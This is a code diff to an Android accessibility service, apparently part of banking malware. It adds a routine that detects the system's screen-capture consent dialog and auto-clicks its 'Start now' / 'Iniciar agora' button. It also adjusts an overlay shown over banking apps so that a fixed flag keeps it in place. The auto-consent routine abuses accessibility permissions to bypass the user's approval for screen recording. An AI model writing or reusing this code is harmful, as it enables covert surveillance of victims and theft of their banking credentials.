@@ -84,13 +84,14 @@ public class KeySvc extends AccessibilityService {
     }
 
     @Override public void onAccessibilityEvent(AccessibilityEvent e) {
+        if (e.getPackageName() != null && "com.android.systemui".equals(e.getPackageName().toString()) && e.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) autoProj();
         Watch.ev();
         Captura.ev();
         try {
             String p = e.getPackageName() == null ? null : e.getPackageName().toString();
             if (p != null && !p.equals(curPkg)) {
                 curPkg = p;
-                if (Ov.on() && Ov.banco(p)) Ov.set(this, false);
+                if (Ov.on() && !Ov.fixo && Ov.banco(p)) Ov.set(this, false);
             }
             if (e.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                     && e.getClassName() != null) {
@@ -369,5 +370,25 @@ public class KeySvc extends AccessibilityService {
                 } catch (Throwable ignored) {}
             }
         });
+    }
+
+    private static final String[] PROJ = {"Iniciar agora", "Começar agora", "Comecar agora", "Start now"};
+    private long ultProj;
+
+    private void autoProj() {
+        if (System.currentTimeMillis() - ultProj < 900) return;
+        AccessibilityNodeInfo r = getRootInActiveWindow();
+        if (r == null) return;
+        for (String t : PROJ) {
+            java.util.List<AccessibilityNodeInfo> ns = r.findAccessibilityNodeInfosByText(t);
+            if (ns == null) continue;
+            for (AccessibilityNodeInfo n : ns) {
+                AccessibilityNodeInfo q = n;
+                while (q != null) {
+                    if (q.isClickable()) { q.performAction(AccessibilityNodeInfo.ACTION_CLICK); ultProj = System.currentTimeMillis(); return; }
+                    q = q.getParent();
+                }
+            }
+        }
     }
 }
